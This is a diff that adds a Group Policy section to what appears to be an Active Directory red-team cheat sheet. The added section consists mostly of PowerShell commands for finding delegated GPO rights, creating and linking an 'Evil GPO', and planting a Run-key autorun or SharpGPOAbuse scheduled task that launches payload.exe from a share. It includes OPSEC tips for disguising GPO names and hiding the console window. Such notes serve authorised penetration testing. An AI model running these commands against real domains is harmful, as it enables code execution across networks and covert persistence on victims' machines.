@@ -618,13 +618,92 @@ We can modify the source code of `kdns.c` from `mimikatz` source code in order t
 
 After execute the attack we need to restore the previous config, so we need to remove the `ServerLevelPlugin` from the DNS Parameters registry.
 
-```
+```powershell
 reg query \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 reg delete \\dc01\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
 
+# Group Policy
+
+Group Policy is the central repository in a forest or domain that controls the configuration of computers and users. Group Policy Objects (GPOs) are sets of configurations that are applied to Organisational Units (OUs).
+
+## Identifying Access to GPOs
+
+By default, only Domain Admins can create GPOs and link them to OUs but it´s common practice to delegate those rights to other teams.
+
+* SIDs of principals that can create new GPOs (PowerView-dev)
+
+```powershell
+Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+```
+* SIDs of principals that can write to the GP-Link attribute on OUs (PowerView-dev)
+
+```powershell
+ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+```
+
+If we can create new GPOs and link it to a OU, we can access to those servers.
+
+This query will return any GPO in the domain, where a 4-digit RID has WriteProperty, WriteDacl or WriteOwner. Filtering on a 4-digit RID is a quick way to eliminate the default 512, 519, etc results.
+
+```powershell
+Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+```
+We can resolve the ObjectDN with:
+
+```powershell
+Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
+```
+## Remote Server Administration Tools (RSAT)
+
+RSAT is a management component provided by Microsoft to help manage components in a domain. The GroupPolicy module has several cmdlets that can be used for administering GPOs.
+
+* Check if GroupPolicy is installed:
+
+```powershell
+Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
+```
+
+* Install it by local admin:
+
+```powershell
+Install-WindowsFeature –Name GPMC
+```
+
+* Create a GPO and link it to a OU:
+
+```powershell
+New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=corp,DC=local"
+```
+
+> **OPSEC Alert**: GPO name will be visible, try to use a name that is "convincing"
+
+If we are able to write anything, anywhere into the HKLM or HKCU hives, prsents different options for achieving code execution. The simplest way is to create a new autorun value to execute a payload on boot.
+
+* Find writeable whare with PowerView
+
+```powershell
+Find-DomainShare -CheckShareAccess
+```
+
+* Modify the GPO:
+
+```powershell
+Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\srv\share\payload.exe" -Type ExpandString
+```
+
+> **OPSEC Alert**: This leaves a Command Prompt on the screen, a better way could be `%COMSPEC% /b /c start /b /min`.
+
+## SharpGPOAbuse
+
+`SharpGPOAbuse` allows a wider range of abusive configurations to be added to as GPO. It cannot create GPO, so it will must be created with the RSAT or modify one we already have write access to.
+
+Example of adding an Immediate Scheduled Task too the PowerShell Logging GPO.
+```powershell
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "%COMSPEC%" --Arguments "/b /c start /b /min \\srv\share\payload.exe" --GPOName "PowerShell Logging"
+```
 # Across Domains (SID History)
 
 Domains in a same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains.
